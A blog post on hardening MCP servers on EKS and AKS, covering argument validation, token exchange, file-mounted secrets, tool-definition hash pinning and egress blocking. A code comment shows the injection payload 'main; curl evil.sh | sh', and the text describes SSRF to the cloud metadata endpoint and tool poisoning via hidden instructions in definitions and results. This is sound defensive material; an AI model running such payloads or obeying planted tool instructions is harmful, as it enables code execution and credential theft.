---
title: "Securing MCP in Production"
date: 2026-10-15
last_modified_at: 2026-10-15T12:31:14+05:30
author: Alok Ranjan Daftuar
description: "MCP's worst CVEs are classic web bugs — injection, path traversal, SSRF — made reachable because the model composes every argument. A layered control set covering input validation, token exchange, definition pinning, and network hardening for EKS and AKS."
excerpt: "The MCP CVEs that keep landing are mostly path traversal, SSRF, and command injection — classic web bugs on an interface where every argument is attacker-influenced. Here is the layered control set that holds up on EKS and AKS."
keywords: "mcp security, model context protocol, command injection, SSRF, path traversal, kubernetes security, secrets management, supply chain security, token exchange, EKS, AKS"
twitter_card: "summary_large_image"
categories:
  - cloud
  - ai-engineering
tags: [mcp, security, kubernetes, secrets-management, supply-chain, aws, azure, zero-trust]
series: "Agentic Infrastructure"
series_order: 5
---

## The threat model most teams start with is the wrong one

Ask a team to threat-model their first MCP server and the whiteboard fills with prompt injection and tool poisoning. Both are real. Neither is where most of the damage has come from. More than 30 CVEs were filed against MCP servers, clients, and tooling in a roughly two-month window in early 2026, and the most common pattern among them — around four in ten — was plain command injection. The August 2026 batch reads like a web-security syllabus: path traversal in an Atlassian integration, a settings tool that leaked a cluster token, SSRF in an ad-platform server, CSRF in a WordPress plugin. Four classic categories, none of them AI-specific.

MCP doesn't introduce new vulnerability classes so much as it removes the friction that used to contain old ones. A conventional API takes input from clients you can authenticate and rate-limit. An MCP tool's arguments are composed by a model that has read whatever text happened to be in its context — a ticket description, a scraped web page, another tool's output. An attacker who can plant text in any of those places influences your tool arguments without ever sending a request to your server. The caller is authenticated; the *content* of the call is not trustworthy.

[Multi-Tenant MCP: Isolation Patterns That Hold Up](/blogs/multi-tenant-mcp-isolation-patterns/) dealt with who a request is allowed to act as. This article deals with what a request can do once it's inside the boundary — and how much damage a single bad argument can cause when it gets through.

## Table of Contents

- [Six Places an Attack Lands](#six-places-an-attack-lands)
- [Arguments Are Untrusted Input](#arguments-are-untrusted-input)
- [Credentials: the Lifecycle, Not the Vault](#credentials-the-lifecycle-not-the-vault)
- [Tool Definitions Are a Supply Chain Too](#tool-definitions-are-a-supply-chain-too)
- [The Container and the Network](#the-container-and-the-network)
- [Where to Start When None of This Exists Yet](#where-to-start-when-none-of-this-exists-yet)
- [An Audit Trail That Doesn't Become a Leak](#an-audit-trail-that-doesnt-become-a-leak)

## Six places an attack lands

```text
 [Model] <── (1) tool definitions ─────────┐
    ▲                                      │
    └────── (3) tool results ◀─────────────┤
 [Agent/Client] ── (2) arguments ──▶ [MCP Server] ── (4) credentials ──▶ [Downstream API]
                                        ▲    │
                   (5) image & deps ────┘    └── (6) egress ──▶ [Internet / node metadata]
```

| # | Surface | What it looks like in practice | Primary control | Enforced at |
| --- | --- | --- | --- | --- |
| 1 | Tool definitions | Hidden instructions in a description or schema; a definition silently changed after approval | Pin approved definitions by hash | Gateway |
| 2 | Tool arguments | Shell metacharacters, `../`, internal URLs, leading-dash flags | Validate, no shell, allowlists | Server code |
| 3 | Tool results | Fetched content carrying instructions aimed at the model | Treat output as untrusted; sanitize | Server + client |
| 4 | Credentials | Static keys in env vars; a token valid against every API | Token exchange, short TTL, file-mounted secrets | Identity + secrets layer |
| 5 | Supply chain | Unpinned image, compromised package | Digest pinning, signature verification | CI + admission |
| 6 | Egress | SSRF reaching the node metadata endpoint | Egress allowlist, metadata blocked | Network |

Rows 2, 4, and 6 are the ones that chain together in real incidents: an injectable argument (2) lets an attacker run a command, which reads a static secret (4) or calls the metadata endpoint (6). Closing any one link breaks the chain, which is why the controls below are layered rather than alternatives.

## Arguments are untrusted input

The handler logic from the previous article scoped every call by tenant. That's necessary, and it says nothing about whether `args.branch` contains a command. Many MCP servers are thin wrappers around CLIs, which is exactly where the injection CVEs concentrate — including the widely deployed `mcp-remote` package (CVE-2025-6514, CVSS 9.6) and argument-injection issues in a reference Git server.

```typescript
// Vulnerable: attacker-influenced string reaches a shell
exec(`git log --oneline ${args.branch}`);   // "main; curl evil.sh | sh"

// Safer: no shell, argument vector, strict allowlist, flag-injection guard
const BRANCH_RE = /^[A-Za-z0-9._\/-]{1,100}$/;
if (!BRANCH_RE.test(args.branch) || args.branch.startsWith("-")) {
  throw new McpError("invalid_argument", 400);
}
execFile("git", ["log", "--oneline", "--end-of-options", args.branch],
         { cwd: repoDir, timeout: 10_000 });
```

Dropping the shell isn't enough on its own. A value starting with `-` is parsed as a flag, so `--end-of-options` (Git 2.24+) and the leading-dash check matter even with `execFile`. The same discipline applies to file paths and URLs, which account for most of the rest:

```typescript
// Path containment: resolve symlinks, then compare against the real root
async function resolveInside(root: string, userPath: string): Promise<string> {
  const full = await realpath(resolve(root, userPath));
  const base = await realpath(root);
  if (full !== base && !full.startsWith(base + sep)) {
    throw new McpError("invalid_argument", 400);
  }
  return full;
}

// SSRF: per-tool host allowlist, not a denylist of "bad" IPs
const ALLOWED_HOSTS = new Set(["api.crm.example.com"]);
const u = new URL(args.url);
if (u.protocol !== "https:" || !ALLOWED_HOSTS.has(u.hostname)) {
  throw new McpError("invalid_argument", 400);
}
```

Comparing the resolved path, not the string, is what defeats symlink and `..` tricks. The host allowlist is deliberately per-tool: a tool that calls one CRM API has no business fetching arbitrary URLs, so the argument shouldn't be able to say otherwise. The network layer backs this up later in the article, because application-level validation is exactly the layer that fails when someone adds a tool in a hurry.

On the output side, the specification places responsibility for sanitizing tool results on the server, since a fetched page or ticket body is a direct path back into the model's context. Equally important, tool annotations such as `readOnlyHint` are self-reported: a server can label a destructive tool read-only and nothing in the protocol stops it. Authorization decisions should never rest on an annotation.

## Credentials: the lifecycle, not the vault

An October 2025 audit of more than 5,200 open-source MCP servers found that 88% need credentials, 53% rely on static API keys or personal access tokens, only about 8.5% use OAuth, and 79% pass secrets through environment variables. [Deploying MCP Servers on Kubernetes](/blogs/deploying-mcp-servers-on-kubernetes/) argued for workload identity over static keys for the pod's own cloud access. The same reasoning extends to every credential the server uses on a caller's behalf — and the env-var number is why it matters here. Environment variables surface in `kubectl describe`, crash dumps, `/proc`, and every child process, so a command-injection bug turns "can run a command" into "can read every secret the server holds."

Three rules cover most of the ground.

**Exchange, don't forward.** Token passthrough is prohibited by the specification, and a server using one static client ID against a third-party API is a confused deputy waiting to happen. The alternative is an RFC 8693 token exchange that trades the inbound token for one narrowed to a single downstream audience and scope:

```bash
curl -s -X POST https://idp.example.com/oauth2/token \
  -d grant_type=urn:ietf:params:oauth:grant-type:token-exchange \
  -d subject_token="$INBOUND_TOKEN" \
  -d subject_token_type=urn:ietf:params:oauth:token-type:access_token \
  -d audience=https://api.crm.example.com \
  -d scope=records.read
```

The result is useless against any other API, so an injected call can't pivot to a different downstream. Audience enforcement has to be verified server-side, not assumed: an advisory fixed in FastMCP 2.14.2 involved an OAuth proxy that ignored the `resource` parameter, allowing a token issued for one server to be reused against another — the failure mode the audience scoping in the previous article exists to prevent.

**Mount secrets as files, not variables.** Where a static secret is unavoidable, pull it from the cloud secrets manager through the Secrets Store CSI driver and read it per call, so rotation takes effect without a restart (the driver's rotation option must be enabled):

```yaml
# AWS — authenticates via the pod's IRSA role
apiVersion: secrets-store.csi.x-k8s.io/v1
kind: SecretProviderClass
metadata:
  name: mcp-downstream-creds
spec:
  provider: aws
  parameters:
    objects: |
      - objectName: "prod/mcp/crm-api"
        objectType: "secretsmanager"
---
# Azure — authenticates via Workload Identity
apiVersion: secrets-store.csi.x-k8s.io/v1
kind: SecretProviderClass
metadata:
  name: mcp-downstream-creds
spec:
  provider: azure
  parameters:
    usePodIdentity: "false"
    clientID: "<workload-identity-client-id>"
    keyvaultName: "kv-mcp-prod"
    tenantId: "<entra-tenant-id>"
    objects: |
      array:
        - |
          objectName: crm-api-key
          objectType: secret
```

The Deployment mounts it as a read-only CSI volume, and the server reads the file on each call rather than caching it at boot:

```yaml
spec:
  template:
    spec:
      containers:
        - name: mcp-server
          volumeMounts:
            - name: creds
              mountPath: /mnt/secrets
              readOnly: true
      volumes:
        - name: creds
          csi:
            driver: secrets-store.csi.k8s.io
            readOnly: true
            volumeAttributes:
              secretProviderClass: mcp-downstream-creds
```

```typescript
// Read per call: a rotated secret is picked up without a pod restart
const crmKey = () => readFile("/mnt/secrets/crm-api-key", "utf8");
```

One subtlety: a file mount removes the env-var exposure paths, but it doesn't remove the file from the container's filesystem. A command-injection bug can still `cat` it, which is why the argument handling above comes first and the privilege restrictions later in this article still matter. File mounts narrow the exposure; they don't replace input validation.

**Keep lifetimes short.** Because the stateless transport evaluates identity on every request, revoking an inbound token takes effect on the next call. That only helps if the downstream token minted from it expires on a comparable timescale — minutes, not hours — otherwise revocation upstream leaves a long-lived credential live downstream.

## Tool definitions are a supply chain too

Tool poisoning is usually described as a description-field problem. Research since the original advisory has shown the whole schema and even tool output can carry injected instructions, which is why grepping descriptions for suspicious phrases catches only a fraction of the problem. The harder variant is the rug pull: a server passes review, runs cleanly for weeks, then changes a definition without anyone re-approving it.

The control that works regardless of how the payload is hidden is to pin what was approved and refuse anything else. A gateway can do this for servers you don't operate:

```typescript
function definitionHash(t: ToolDefinition): string {
  // Hash everything the model will read, not just the description.
  const canonical = canonicalJson({
    name: t.name,
    description: t.description,
    inputSchema: t.inputSchema,
    annotations: t.annotations ?? {},
  });
  return createHash("sha256").update(canonical).digest("hex");
}

async function admitTools(serverId: string, listed: ToolDefinition[]) {
  const approved = await registry.approvedHashes(serverId); // Map<name, hash>
  return listed.filter((t) => {
    const ok = approved.get(t.name) === definitionHash(t);
    if (!ok) audit.warn("tool_definition_changed", { serverId, tool: t.name });
    return ok;
  });
}
```

`canonicalJson` stands in for any recursive sorted-key serializer — a plain `JSON.stringify` with a key-list replacer silently drops nested fields, which would hash the schema incompletely. Anything not approved never reaches the model's context, and a changed definition is quarantined until a human re-approves it.

## The container and the network

Three controls bound the damage when an argument does slip through.

**Pin and verify the image.** Deploy by digest, not tag, and sign in CI so admission can reject anything unsigned:

```bash
cosign sign   --key cosign.key registry.example.com/mcp-server@sha256:<digest>
cosign verify --key cosign.pub registry.example.com/mcp-server@sha256:<digest>
```

A Kyverno or Sigstore policy-controller admission rule on the MCP namespaces enforces the verification at the cluster boundary; cosign works the same against ECR and ACR, which keeps the pipeline identical across both clouds.

**Strip the pod's privileges.** A command-injection bug runs with whatever the process has. Make that as little as possible:

```yaml
securityContext:
  runAsNonRoot: true
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  capabilities: { drop: ["ALL"] }
  seccompProfile: { type: RuntimeDefault }
```

**Block the metadata endpoint.** SSRF is dangerous mostly because of where it leads: the node metadata service at `169.254.169.254`, which is how a server-side request becomes stolen cloud credentials. IRSA and Workload Identity use projected tokens and don't need node metadata access, so blocking it is safe:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata-endpoint
  namespace: mcp-tenant-acme
spec:
  podSelector: {}
  policyTypes: [Egress]
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except: ["169.254.169.254/32"]
```

One caveat is easy to miss: NetworkPolicies are additive. If the tenant policy from the previous article already restricts egress to the tenant namespace plus DNS, adding this one *widens* egress to the whole internet. Use this form only for pods that genuinely need public egress, and use it *instead of* a blanket allow rather than alongside a stricter policy. Kubernetes NetworkPolicy can't match domain names, so a per-destination allowlist for public egress belongs in AWS Network Firewall domain rules or Azure Firewall FQDN rules. On EKS, setting the IMDSv2 hop limit to 1 on the nodes adds a second barrier.

## Where to start when none of this exists yet

Applying all six controls at once is rarely realistic for a server already in production. The order below is by how much risk each step removes relative to the effort it takes, not by how interesting the control is:

| Order | Control | Effort | Why this position |
| --- | --- | --- | --- |
| 1 | Argument validation: no shell, path containment, host allowlists | Low, code-only | Closes the single most common CVE pattern with no infrastructure change |
| 2 | Move secrets from env vars to file mounts | Low | Removes the cheapest way to turn an injection bug into a secrets leak |
| 3 | Block the metadata endpoint | Low, one policy | Stops SSRF from becoming cloud-credential theft |
| 4 | Container hardening (`securityContext`) | Low | Bounds what a successful injection can touch |
| 5 | Token exchange with audience scoping | Medium | Needs identity-provider support; removes the confused-deputy pivot |
| 6 | Definition pinning and image signing | Medium | Needs a registry and CI changes; defends against supply-chain and rug-pull cases |

The first four fit in a single sprint and don't require touching the identity provider or the CI pipeline. The last two take coordination across teams, which is the reason they come later, not a sign they matter less for a server exposed to third-party tools.

## An audit trail that doesn't become a leak

None of these controls help during an investigation unless every call leaves a record, and the record itself must not become a new exposure. Log decisions and fingerprints, not payloads — arguments routinely contain the very secrets and personal data the rest of this article protects:

```json
{
  "ts": "2026-10-14T09:12:03Z",
  "tenant": "acme",
  "tool": "get-record",
  "definition_sha256": "9f2c…",
  "args_sha256": "41ab…",
  "decision": "allowed",
  "downstream_audience": "https://api.crm.example.com"
}
```

The definition hash ties each call to the exact tool version that was approved, and the argument hash lets two events be correlated — or a specific suspicious payload be matched later — without storing it.

> 📌 **Key Takeaway:** MCP's worst vulnerabilities are classic web bugs — injection, path traversal, SSRF, leaked tokens — made reachable by an interface where the model, not a vetted client, composes every argument. No single control closes that gap. Validate arguments as untrusted input, exchange short-lived audience-scoped tokens instead of holding static ones, pin tool definitions, and constrain the container and network so one bad argument has nowhere useful to go.
